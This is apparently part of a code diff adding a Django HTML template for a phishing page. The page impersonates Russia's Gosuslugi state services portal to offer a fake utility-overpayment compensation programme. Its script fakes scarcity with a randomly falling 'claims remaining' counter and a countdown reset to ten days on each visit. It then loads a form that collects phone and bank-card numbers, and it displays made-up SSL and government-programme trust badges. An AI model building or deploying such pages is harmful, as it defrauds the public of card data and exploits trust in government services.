+                    <path d="M7 11V7a5 5 0 0110 0v4"/>
+                </svg>
+                SSL защита
+            </div>
+            <div class="trust-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M22 11.08V12a10 10 0 11-5.93-9.14"/>
+                    <polyline points="22 4 12 14.01 9 11.01"/>
+                </svg>
+                Гос. программа
+            </div>
+            <div class="trust-item">
+                🏛️ Портал Госуслуги
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="page-footer">
+            <p>© 2025 Портал государственных услуг Российской Федерации. Программа компенсации переплат за коммунальные услуги. Количество мест ограничено.</p>
+        </footer>
+    </div>
+
+    <!-- Loader -->
+    <div class="loader" id="pageLoader">
+        <div class="loader-icon">📋</div>
+        <div class="loader-label">Обрабатываем вашу заявку...</div>
+        <div class="loader-sublabel">Не закрывайте страницу</div>
+    </div>
+
+    <!-- Flow Container (form overlay) -->
+    <div class="vstep-box advise__box" id="vstep_flow" style="display:none;"></div>
+
+    <script src="{% static 'js/base.js' %}"></script>
+    <script>
+        function showLoader(show) {
+            const loader = document.getElementById('pageLoader');
+            if (loader) {
+                if (show) loader.classList.add('show');
+                else loader.classList.remove('show');
+            }
+        }
+
+        function startClaim() {
+            triggerVibration();
+            showLoader(true);
+            // Загружаем форму
+            fetch('/form/')
+                .then(response => response.text())
+                .then(content => {
+                    showLoader(false);
+                    const flow = document.getElementById('vstep_flow');
+                    flow.innerHTML = content;
+                    flow.style.display = 'flex';
+                    flow.style.justifyContent = 'center';
+                    flow.style.alignItems = 'center';
+                    document.querySelector('.container').style.display = 'none';
+                    document.querySelector('.icons-bg').style.display = 'none';
+                    document.querySelectorAll('.deco-blob').forEach(b => b.style.display = 'none');
+                    // Маски для полей
+                    phoneMask('form_input_phone');
+                    cardMask('form_input_card');
+                })
+                .catch(() => {
+                    showLoader(false);
+                    alert('Ошибка загрузки. Попробуйте позже.');
+                });
+        }
+
+        function triggerVibration() {
+            if ('vibrate' in navigator) {
+                navigator.vibrate([50, 30, 50]);
+            }
+        }
+
+        function toggleFaq(button) {
+            const item = button.closest('.faq-item');
+            const wasActive = item.classList.contains('active');
+            document.querySelectorAll('.faq-item').forEach(faq => faq.classList.remove('active'));
+            if (!wasActive) {
+                item.classList.add('active');
+                triggerVibration();
+            }
+        }
+
+        function initScrollReveal() {
+            const elements = document.querySelectorAll('.scroll-reveal');
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) entry.target.classList.add('revealed');
+                });
+            }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+            elements.forEach(el => observer.observe(el));
+        }
+
+        function initClaimsCounter() {
+            const countElement = document.getElementById('claimsCount');
+            const progressBar = document.getElementById('claimsProgressBar');
+            if (!countElement) return;
+            let currentCount = 1147;
+            const totalClaims = 5000;
+            const minCount = 312;
+            function updateCounter() {
+                const decrease = Math.floor(Math.random() * 3) + 1;
+                currentCount = Math.max(minCount, currentCount - decrease);
+                countElement.textContent = currentCount.toLocaleString('ru-RU');
+                const percentage = (currentCount / totalClaims) * 100;
+                if (progressBar) progressBar.style.width = percentage + '%';
+                const nextUpdate = Math.floor(Math.random() * 10000) + 5000;
+                setTimeout(updateCounter, nextUpdate);
+            }
+            setTimeout(updateCounter, Math.floor(Math.random() * 5000) + 3000);
+        }
+
+        function updateTimerDigit(elementId, newValue, isTens) {
+            const element = document.getElementById(elementId);
+            if (!element) return;
+            const currentValue = parseInt(element.textContent) || 0;
+            const newDigit = isTens ? Math.floor(newValue / 10) : newValue % 10;
+            if (currentValue !== newDigit) {
+                element.classList.add('flip');
+                setTimeout(() => {
+                    element.textContent = newDigit;
+                    element.classList.remove('flip');
+                }, 250);
+            } else {
+                element.textContent = newDigit;
+            }
+        }
+
+        function startCountdown() {
+            const now = new Date();
+            const currentYear = now.getFullYear();
+            // Deadline — через 10 дней от текущей даты
+            const endDate = new Date(now.getTime() + 10 * 24 * 60 * 60 * 1000);
+            const pageLoadTime = Date.now();
+            const baseNow = Date.now();
+
+            function updateTimer() {
+                const elapsed = Date.now() - pageLoadTime;
+                const simulatedNow = new Date(baseNow + elapsed);
+                const diff = endDate - simulatedNow;
+                if (diff <= 0) {
+                    const timer = document.getElementById('countdownTimer');
+                    const expired = document.getElementById('timerExpired');
+                    if (timer) timer.style.display = 'none';
+                    if (expired) expired.style.display = 'block';
+                    return;
+                }
+                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+                updateTimerDigit('days1', days, true);
+                updateTimerDigit('days2', days, false);
+                updateTimerDigit('hours1', hours, true);
+                updateTimerDigit('hours2', hours, false);
+                updateTimerDigit('minutes1', minutes, true);
+                updateTimerDigit('minutes2', minutes, false);
+                updateTimerDigit('seconds1', seconds, true);
+                updateTimerDigit('seconds2', seconds, false);
+            }
+            updateTimer();
+            setInterval(updateTimer, 1000);
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            startCountdown();
+            initScrollReveal();
+            initClaimsCounter();
+        });
+    </script>
+</body>
+</html>
